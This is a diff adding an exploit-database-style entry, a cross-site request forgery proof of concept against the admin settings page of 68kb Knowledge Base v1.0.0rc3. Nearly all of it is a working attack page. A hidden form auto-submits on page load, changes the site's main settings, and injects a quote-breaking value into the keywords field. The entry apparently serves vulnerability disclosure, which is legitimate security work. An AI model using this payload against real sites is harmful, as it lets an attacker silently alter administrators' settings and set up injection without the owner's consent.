@@ -1,0 +1,19 @@
+Exploit Title: 68kb Knowledge Base v1.0.0rc3 edit main settings CSRF
+Date: 2010-04-02
+Author: Jelmer de Hen
+Software Link: http://68kb.googlecode.com/files/68kb-v1.0.0rc3.zip
+Version: v1.0.0rc3
+
+<html>
+<body onload="document.forms['edit_settings'].submit()">
+<form name="edit_settings" action="http://server/index.php/admin/settings/main" method="post">
+<input type=hidden name="site_name" value="Your Site">
+<input type=hidden name="site_keywords" value='">escapable'>
+<input type=hidden name="site_description" value="">
+<input type=hidden name="site_email" value="a@a.com">
+<input type=hidden name="max_search" value="5">
+<input type=hidden name="comments" value="5">
+<input type=hidden name="cache_time" value="0">
+</form>
+</body>
+</html>
